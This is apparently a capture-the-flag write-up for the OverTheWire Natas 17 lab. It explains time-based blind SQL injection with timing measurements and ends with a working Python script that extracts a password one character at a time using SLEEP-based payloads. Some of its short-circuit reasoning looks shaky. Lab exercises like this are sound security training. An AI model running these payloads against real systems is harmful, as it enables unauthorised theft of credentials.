**The query structure matters:**

With `natas18" OR SLEEP(5)##`:
```sql
SELECT * FROM users WHERE username="natas18" OR SLEEP(5)##"
```
MySQL evaluates `OR` lazily — but since `username="natas18"` returns **1 row (true)**, does it still sleep?

Yes — `SLEEP(5)` runs **once per row evaluated**, and with `OR`, MySQL still evaluates the right side for rows where the left side is false. But more importantly — the table has multiple rows, so:

**Breaking down the timings:**

| Input | Time | Explanation |
|---|---|---|
| `natas18` (clean) | ~1,239ms | Baseline network + query execution, no sleep |
| `natas18" OR SLEEP(5)##` | ~16,239ms | 1,239ms baseline + **3× SLEEP(5)** = 3 rows in the table |
| `natas" OR SLEEP(5)##` | ~21,240ms | 1,239ms baseline + **4× SLEEP(5)** = 4 rows in the table |

**Why different sleep counts?**

- `natas18` **exists** in the table → MySQL short-circuits that row (no sleep for it), sleeps for the remaining rows
- `natas` likely **doesn't exist** → no short-circuiting, SLEEP runs for all rows

This tells you:
- The `users` table has **~4 rows total**
- `natas18` is one of them (saves one SLEEP due to OR short-circuit)
- `natas` is not a real username

This timing side-channel is exactly how blind SQL injection works in practice — you can extract data **one bit at a time** even when the app shows zero output, using queries like:
```sql
" AND IF(SUBSTR(password,1,1)="a", SLEEP(5), 0)##
```

Solution:

```python
import requests
import string

URL = 'http://natas17.natas.labs.overthewire.org/'
AUTH = ('natas17', 'Eq...F0OC')
PASSWORD_LENGTH = 32
CHARSET = string.ascii_letters + string.digits
THRESHOLD = 3

password = ''

for i in range(1, PASSWORD_LENGTH+1):
    for c in CHARSET:
        PAYLOAD = {
            'username': f'natas18" AND IF(BINARY SUBSTRING(password,{i},1)="{c}", SLEEP(5), 0)##'}

        response = requests.post(URL, data=PAYLOAD, auth=AUTH)
        elapsed = response.elapsed.total_seconds()

        if (elapsed > THRESHOLD):
            password += c
            print(f'[+] Position {i}: {c} ({elapsed:.2f}s)')
            print(f'[*] Password found so far: {password}')
            break
    else:
        print(f'[!] Position {i}: no match found, skipping')

print(f'Final Password: {password}')
```
